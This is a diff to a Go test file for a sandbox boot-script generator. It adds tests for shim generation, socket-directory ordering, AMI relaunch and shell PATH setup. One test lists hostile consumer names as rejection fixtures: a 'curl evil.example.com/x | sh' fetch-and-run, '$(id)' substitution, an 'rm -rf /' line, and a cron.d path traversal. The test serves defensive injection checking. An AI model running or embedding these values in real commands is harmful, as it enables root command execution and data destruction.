@@ -157,9 +157,11 @@ func TestUserdataSopsBlock_ConsumersDefaultAndFromGrants(t *testing.T) {
 		if err != nil {
 			t.Fatalf("generateUserData failed: %v", err)
 		}
-		for _, want := range []string{"/opt/km/shims/claude", "/opt/km/shims/codex"} {
+		// Match the generating line, not the bare path: the surrounding comments
+		// mention /opt/km/shims/claude and would satisfy a looser assertion.
+		for _, want := range []string{`cat > "/opt/km/shims/claude"`, `cat > "/opt/km/shims/codex"`} {
 			if !strings.Contains(out, want) {
-				t.Errorf("expected default shim %q; not found", want)
+				t.Errorf("expected default shim generation %q; not found", want)
 			}
 		}
 		if !strings.Contains(out, `Environment='KM_SECRETS_GRANTS={}'`) {
@@ -177,18 +179,62 @@ func TestUserdataSopsBlock_ConsumersDefaultAndFromGrants(t *testing.T) {
 		if err != nil {
 			t.Fatalf("generateUserData failed: %v", err)
 		}
-		alpha := strings.Index(out, "/opt/km/shims/alpha")
-		zeta := strings.Index(out, "/opt/km/shims/zeta")
+		alpha := strings.Index(out, `cat > "/opt/km/shims/alpha"`)
+		zeta := strings.Index(out, `cat > "/opt/km/shims/zeta"`)
 		if alpha < 0 || zeta < 0 {
 			t.Fatalf("expected shims for both grant keys; alpha=%d zeta=%d", alpha, zeta)
 		}
 		if alpha > zeta {
 			t.Error("shim generation is not sorted: userdata would differ run to run for the same profile")
 		}
-		if strings.Contains(out, "/opt/km/shims/claude") {
+		if strings.Contains(out, `cat > "/opt/km/shims/claude"`) {
 			t.Error("declared grants must replace the default consumer set, not extend it")
 		}
 	})
+}
+
+// TestUserdataSopsBlock_HostileConsumerNameIsRejected pins the compiler half of
+// I3, and it is the half that actually matters on the remote path.
+// cmd/create-handler never calls profile.Validate, so the JSON schema's
+// propertyNames pattern is not consulted at all for a remote km create — this
+// guard is then the ONLY barrier between a profile fetched from S3 and arbitrary
+// root command execution during bootstrap. Deliberately exactly as strict as the
+// validator, the same disposition the repo records for iam.allowedSecretPaths.
+func TestUserdataSopsBlock_HostileConsumerNameIsRejected(t *testing.T) {
+	hostile := []string{
+		"claude; curl evil.example.com/x | sh",
+		"claude' ; touch /tmp/pwned ; '",
+		"../../etc/cron.d/x",
+		"claude/codex",
+		"claude codex",
+		"claude$(id)",
+		"claude\nrm -rf /",
+		"",
+		strings.Repeat("a", 65), // maxLength 64
+	}
+	for _, name := range hostile {
+		t.Run(name, func(t *testing.T) {
+			p := sopsBundleProfile()
+			p.Spec.Secrets.Grants = map[string][]string{name: {"ANTHROPIC_API_KEY"}}
+			out, err := generateUserData(p, "sb-hostile", nil, "my-bucket", false, nil)
+			if err == nil {
+				t.Fatalf("compile accepted consumer name %q; it would be interpolated "+
+					"into the root boot shell. Output:\n%s", name, out)
+			}
+			if !strings.Contains(err.Error(), "consumer name") {
+				t.Errorf("error should name the problem, got %v", err)
+			}
+		})
+	}
+
+	// The legitimate set must still compile, or the guard is just an outage.
+	p := sopsBundleProfile()
+	p.Spec.Secrets.Grants = map[string][]string{
+		"claude": {"A"}, "codex": {"B"}, "km-env": {"C"}, "my_agent": {"D"}, "agent.v2": {"E"},
+	}
+	if _, err := generateUserData(p, "sb-ok", nil, "my-bucket", false, nil); err != nil {
+		t.Fatalf("compile rejected legitimate consumer names: %v", err)
+	}
 }
 
 // TestUserdataSopsBlock_ShimExecsAbsolutePath verifies the shim never resolves
@@ -201,7 +247,7 @@ func TestUserdataSopsBlock_ShimExecsAbsolutePath(t *testing.T) {
 		t.Fatalf("generateUserData failed: %v", err)
 	}
 
-	if !strings.Contains(out, `exec /opt/km/bin/km-env exec --as claude -- "\$KM_REAL" "\$@"`) {
+	if !strings.Contains(out, `exec /opt/km/bin/km-env exec --as 'claude' -- "\$KM_REAL" "\$@"`) {
 		t.Error("shim must exec an absolute path via km-env, not the bare consumer name")
 	}
 	// The fallback search must strip the shim dir, or it re-finds the shim.
@@ -238,6 +284,145 @@ func TestUserdataSopsBlock_ShimCarriesLiteralTargetForSelftest(t *testing.T) {
 	if !strings.Contains(out, "# NOTE: km-secretsd selftest (shimTarget) parses this KM_REAL= line") {
 		t.Error("the generated shim must say that a parser depends on the KM_REAL= line, " +
 			"or the next person to reformat the shim silently breaks the boot check")
+	}
+}
+
+// TestUserdataSopsBlock_SocketDirExistsBeforeBrokerStarts pins C1. The broker
+// binds /run/km/secrets.sock, and /run is tmpfs. The sidecar block that normally
+// creates /run/km runs ~75 lines AFTER the 5.5 block, so without an earlier
+// mkdir the daemon's net.Listen fails ENOENT on a fresh boot.
+//
+// The failure is doubly hidden, which is why this is pinned by position rather
+// than presence: the ExecStartPost socket poll converts it into a chgrp error
+// that blames the socket, and the 7.9 selftest SKIPS its socket check when the
+// socket is absent instead of failing it — so the boot can print "secrets
+// self-test passed" over a permanently dead broker.
+func TestUserdataSopsBlock_SocketDirExistsBeforeBrokerStarts(t *testing.T) {
+	p := sopsBundleProfile()
+	out, err := generateUserData(p, "sb-sockdir", nil, "my-bucket", false, nil)
+	if err != nil {
+		t.Fatalf("generateUserData failed: %v", err)
+	}
+
+	mkdir := strings.Index(out, "\nmkdir -p /run/km\n")
+	start := strings.Index(out, "systemctl enable --now km-secretsd.service")
+	if mkdir < 0 {
+		t.Fatal("no mkdir -p /run/km in the output at all")
+	}
+	if start < 0 {
+		t.Fatal("km-secretsd is never started")
+	}
+	if mkdir > start {
+		t.Errorf("the first mkdir -p /run/km (byte %d) comes AFTER km-secretsd starts "+
+			"(byte %d): the broker would fail ENOENT binding its socket", mkdir, start)
+	}
+
+	// Reboot and resume never run userdata, and this unit is not ordered after
+	// the one that recreates /run/km, so the unit must create it itself.
+	if !strings.Contains(out, "ExecStartPre=/bin/mkdir -p /run/km") {
+		t.Error("km-secretsd.service needs ExecStartPre=/bin/mkdir -p /run/km: " +
+			"/run is tmpfs and userdata does not re-run on reboot or km resume")
+	}
+	// RuntimeDirectory=km would look equivalent and is not: its default
+	// RuntimeDirectoryPreserve=no DELETES /run/km when the broker stops, taking
+	// the km-audit-log sidecar's audit-pipe FIFO with it.
+	// Anchored at line start so the comment explaining why we avoid it does not
+	// satisfy the check.
+	if strings.Contains(out, "\nRuntimeDirectory=km") {
+		t.Error("RuntimeDirectory=km would delete /run/km on stop, destroying the audit FIFO")
+	}
+}
+
+// TestUserdataSopsBlock_AMIRelaunchCannotBakeSelfTargetingShim pins I2.
+// /opt/km/shims is on the root volume, so a sandbox launched from a baked AMI
+// (spec.runtime.ami, a shipped feature) starts with the bake source's shims
+// present AND on PATH. A plain `command -v claude` then returns the shim, and we
+// would bake a shim whose target is itself. The runtime fallback does not save
+// it — that path IS executable — and km-secretsd's selftest treats a
+// self-targeting shim as fatal, so every AMI-backed secrets profile would abort
+// its boot.
+func TestUserdataSopsBlock_AMIRelaunchCannotBakeSelfTargetingShim(t *testing.T) {
+	p := sopsBundleProfile()
+	out, err := generateUserData(p, "sb-amishim", nil, "my-bucket", false, nil)
+	if err != nil {
+		t.Fatalf("generateUserData failed: %v", err)
+	}
+
+	if !strings.Contains(out, "rm -f /opt/km/shims/*") {
+		t.Error("stale shims from an AMI bake must be cleared before regenerating")
+	}
+	// Belt as well as braces: resolution must exclude the shim dir the same way
+	// the generated shim's own fallback does.
+	if !strings.Contains(out, `grep -v "^/opt/km/shims$"`) {
+		t.Error("target resolution must strip /opt/km/shims from PATH, or a surviving " +
+			"shim resolves as its own target")
+	}
+	// The bare form is the bug; it must not survive anywhere.
+	if strings.Contains(out, `bash -lc 'command -v claude'`) {
+		t.Error("resolution still uses an unfiltered PATH lookup")
+	}
+}
+
+// TestUserdataSopsBlock_ConsumerNameIsNeverSplicedIntoScript pins the shell half
+// of I3. The schema and the compiler both reject a metacharacter-bearing
+// consumer name, but the boot script should not depend on that being the only
+// line of defence: the name is passed to the resolver as a positional ARGUMENT
+// rather than spliced into the script text, and every path built from it is
+// quoted.
+func TestUserdataSopsBlock_ConsumerNameIsNeverSplicedIntoScript(t *testing.T) {
+	p := sopsBundleProfile()
+	out, err := generateUserData(p, "sb-noSplice", nil, "my-bucket", false, nil)
+	if err != nil {
+		t.Fatalf("generateUserData failed: %v", err)
+	}
+
+	if !strings.Contains(out, `command -v "$1"' km-shim 'claude'`) {
+		t.Error("the consumer name must reach the resolver as a positional argument, not as script text")
+	}
+	for _, want := range []string{
+		`cat > "/opt/km/shims/claude"`,
+		`chmod 0755 "/opt/km/shims/claude"`,
+		`chown root:root "/opt/km/shims/claude"`,
+	} {
+		if !strings.Contains(out, want) {
+			t.Errorf("expected quoted path %q; an unquoted one word-splits on a hostile name", want)
+		}
+	}
+}
+
+// TestUserdataSopsBlock_ShimPrependAlsoInBashrc pins I4. nvm installs NO
+// /etc/profile.d script — its installer APPENDS to ~/.bashrc, and a bash login
+// shell reads /etc/profile.d/* BEFORE ~/.profile sources ~/.bashrc. So nvm's
+// prepend lands after ours and an nvm-managed agent beats /opt/km/shims.
+// profile.d alone leaves the shim inert with no error wherever nvm owns the
+// agent, and km-secretsd's selftest asserts the login-shell resolution as FATAL,
+// so the boot would abort. Today's profiles escape only by accident.
+func TestUserdataSopsBlock_ShimPrependAlsoInBashrc(t *testing.T) {
+	p := sopsBundleProfile()
+	out, err := generateUserData(p, "sb-bashrc", nil, "my-bucket", false, nil)
+	if err != nil {
+		t.Fatalf("generateUserData failed: %v", err)
+	}
+
+	if !strings.Contains(out, "/home/sandbox/.bashrc") {
+		t.Fatal("the shim prepend must also reach the sandbox user's ~/.bashrc, " +
+			"or nvm's own prepend wins the interactive and login-shell paths")
+	}
+	// Guarded, because userdata's shim section can run again on an AMI relaunch
+	// where ~/.bashrc is baked in.
+	if !strings.Contains(out, `grep -q '/opt/km/shims' "$KM_SANDBOX_BASHRC"`) {
+		t.Error("the ~/.bashrc append must be guarded against duplicating on repeated boots")
+	}
+	// Both hooks, not one: profile.d covers the case where ~/.bashrc returns
+	// early (a non-interactive login shell on a distro whose .bashrc guards on
+	// interactivity), and nvm does not run there either.
+	if !strings.Contains(out, "/etc/profile.d/zz-km-shims.sh") {
+		t.Error("the profile.d hook must be kept alongside the ~/.bashrc append")
+	}
+	// The old comment blamed a profile.d script nvm does not install. A wrong
+	// explanation is what misleads the next person to "simplify" this.
+	if strings.Contains(out, "wins over nvm's own\n# profile.d script") {
+		t.Error("the stale nvm/profile.d explanation is back; nvm appends to ~/.bashrc")
 	}
 }
 
